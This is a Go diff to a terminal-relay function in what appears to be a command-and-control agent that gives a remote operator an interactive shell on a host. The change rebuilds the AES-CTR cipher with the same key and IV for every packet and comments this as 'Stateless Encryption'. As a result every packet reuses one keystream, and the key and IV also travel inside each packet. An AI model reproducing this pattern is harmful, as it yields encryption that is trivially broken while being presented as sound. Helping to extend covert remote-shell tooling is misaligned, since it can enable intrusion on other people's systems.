@@ -1317,13 +1317,14 @@ func jobTerminal(paramsData []byte) {
 			return
 		}
 
+		// Stateless Encryption: Stream ciphers created per-packet to match Server logic
 		encCipher, _ := aes.NewCipher(tunKey)
-		encStream := cipher.NewCTR(encCipher, tunIv)
-		streamWriter := &cipher.StreamWriter{S: encStream, W: srvConn}
-
 		decCipher, _ := aes.NewCipher(tunKey)
-		decStream := cipher.NewCTR(decCipher, tunIv)
-		streamReader := &cipher.StreamReader{S: decStream, R: srvConn}
+		
+		// streamWriter/Reader only for TCP/TLS fallback
+		// For QUIC, we use manual XOR per packet
+		streamWriter := &cipher.StreamWriter{S: cipher.NewCTR(encCipher, tunIv), W: srvConn}
+		streamReader := &cipher.StreamReader{S: cipher.NewCTR(decCipher, tunIv), R: srvConn}
 
 		ctx, cancel := context.WithCancel(context.Background())
 		TERMINALS.Store(params.TermId, cancel)
@@ -1354,8 +1355,11 @@ func jobTerminal(paramsData []byte) {
 						break
 					}
 					if len(encData) > 0 {
+						// Stateless Decrypt: Reset CTR for each packet
 						decData := make([]byte, len(encData))
-						decStream.XORKeyStream(decData, encData)
+						localDecStream := cipher.NewCTR(decCipher, tunIv)
+						localDecStream.XORKeyStream(decData, encData)
+
 						if rw, ok := ptyProc.(io.ReadWriter); ok {
 							_, err = rw.Write(decData)
 						} else {
@@ -1385,7 +1389,10 @@ func jobTerminal(paramsData []byte) {
 				// Encrypt payload to maintain stream cipher state sync
 				initPayload := []byte("\n")
 				encInitPayload := make([]byte, len(initPayload))
-				encStream.XORKeyStream(encInitPayload, initPayload)
+				
+				// Stateless Encrypt
+				localEncStream := cipher.NewCTR(encCipher, tunIv)
+				localEncStream.XORKeyStream(encInitPayload, initPayload)
 
 				initTermPack := utils.TermPack{Id: uint(AgentId), TermId: params.TermId, Key: tunKey, Iv: tunIv, Alive: true, Data: encInitPayload}
 				initTpData, _ := msgpack.Marshal(initTermPack)
@@ -1415,7 +1422,10 @@ func jobTerminal(paramsData []byte) {
 					
 					if n > 0 {
 						encData := make([]byte, n)
-						encStream.XORKeyStream(encData, buf[:n])
+						
+						// Stateless Encrypt: Reset CTR for each packet
+						localEncStream := cipher.NewCTR(encCipher, tunIv)
+						localEncStream.XORKeyStream(encData, buf[:n])
 
 						termPack := utils.TermPack{Id: uint(AgentId), TermId: params.TermId, Key: tunKey, Iv: tunIv, Alive: true, Data: encData}
 						tpData, _ := msgpack.Marshal(termPack)
